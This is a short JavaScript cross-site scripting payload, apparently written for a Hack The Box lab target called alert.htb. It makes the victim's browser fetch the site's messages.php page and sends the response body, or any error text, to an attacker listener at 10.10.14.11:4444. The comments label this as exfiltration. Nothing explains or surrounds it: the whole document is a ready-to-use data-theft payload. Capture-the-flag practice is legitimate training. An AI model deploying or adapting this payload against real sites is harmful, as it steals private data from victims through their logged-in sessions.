<script>
fetch("http://alert.htb/messages.php", {
    method: "GET"
})
.then(response => {
    if (!response.ok) {
        throw new Error(`HTTP error! status: ${response.status} ${response.statusText}`);
    }
    return response.text(); // Get the response body as text
})
.then(data => {
    console.log("Original data:", data); // For debugging
    fetch(`http://10.10.14.11:4444/?result=${encodeURIComponent(data)}`, { method: "GET" })
        .catch(exfilError => console.error("Error exfiltrating result:", exfilError)); // Optional: log exfil error
})
.catch(error => {
    console.error("Original error:", error); // For debugging
    fetch(`http://10.10.14.11:4444/?error=${encodeURIComponent(error.toString())}`, { method: "GET" })
        .catch(exfilError => console.error("Error exfiltrating error:", exfilError)); // Optional: log exfil error
});
</script>